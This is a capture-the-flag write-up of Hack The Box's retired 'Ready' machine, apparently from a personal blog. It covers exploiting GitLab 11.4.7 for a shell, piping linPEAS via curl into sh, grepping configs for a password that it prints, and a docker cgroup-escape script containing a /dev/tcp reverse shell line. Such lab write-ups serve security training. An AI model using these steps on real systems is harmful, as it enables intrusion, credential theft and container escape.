---
title: "Ready HTB Writeup"
date: 2021-05-17T19:32:32+02:00
draft: false
Tags: [
    "Writeups",
    "hackthebox",
    "retired",
    "medium",
    "linux",
]
---
![Machine Info](/images/ready/1.png)

### 1. Enumeration:
* Nmap:
![](/images/ready/2.png)

2. Web Enumeration:
  * PORT 5080:
Got gitlab login form
![](/images/ready/3.png)

let's sign up:
![](/images/ready/4.png)

and we 're in:
![](/images/ready/5.png)

checking /help :
* it's gitlab version 11.4.7 
![](/images/ready/6.png)

Searching for exploits:
* got public one from exploitdb
![](/images/ready/7.png)
![](/images/ready/8.png)

* let's download and edit the exploit:

![](/images/ready/9.png)
![](/images/ready/10.png)
![](/images/ready/11.png)
![](/images/ready/12.png)

As i remember it didn't work properly (there are some new versions of this exploit on exploitdb now) and i used another exploit from github back then

* Github [exploit](https://github.com/dotPY-hax/gitlab_RCE):
  * download and edit:
![](/images/ready/13.png)

![](/images/ready/14.png)
![](/images/ready/15.png)

* ``python3 gitlab_rce.py http://10.10.10.220;5080 10.10.16.15``
![](/images/ready/16.png)

open netcat listener first and got session:
![](/images/ready/17.png)
![](/images/ready/19.png)

We are in as git

Got user ``dude`` flag:
![](/images/ready/18.png)

### Privilege Escalation:

* let's transfer our ``linPEAS`` script:

  * ``$ sudo python -m SimpleHTTPServer 80`` >> In the folder where linPEAS is

  * ``$ curl 10.10.16.15/linPEAS.sh | sh`` >> On the target machine

![](/images/ready/20.png)

![](/images/ready/29.png)
It roams the target machine looking for any interesting stuff to privilege with it .. i'll show the interesting ones only;

```text
Possible private SSH keys were found!
/var/opt/gitlab/gitlab-rails/etc/secrets.yml
```
![](/images/ready/21.png)

This gitlab.rb looks interesting:

![](/images/ready/22.png)

lets check the important paths manually:

![](/images/ready/23.png)
tons of tokens and private keys 

lets check ``gitlab.rb``:

![](/images/ready/24.png)
![](/images/ready/25.png)
Tons of configurations 
* lets just grep any passwords
  * ``cat gitlab.rb | grep -i password``
![](/images/ready/26.png)

and here we got the same password from the script again >>
``wW59U!ZKMbG9+*#h``

This will give us gitlab root not the root of ready .. 

### Rooting:

* lets switch to gitlab root

![](/images/ready/27.png)
![](/images/ready/28.png)

* docker privilege linux breakout >> got [this](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)

![](/images/ready/30.png)

```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
Let's make a file and put this script into it:
  * don't forget to put your own ip > mine 10.10.16.15:
![](/images/ready/31.png)

let's transfer it to target machine:
![](/images/ready/32.png)
![](/images/ready/33.png)

* With changing it's mode to executable and running our netcat first on port 9000 specified already in the script:
![](/images/ready/34.png)

And here we go > finally got the root of ready machine:
![](/images/ready/35.png)

![](/images/ready/36.png)


![](/images/complete.gif)

Hope you enjoyed this writeup ..

If so kindly give me respect [Wh1rlw1nd-HTB](https://www.hackthebox.eu/home/users/profile/182588) ..
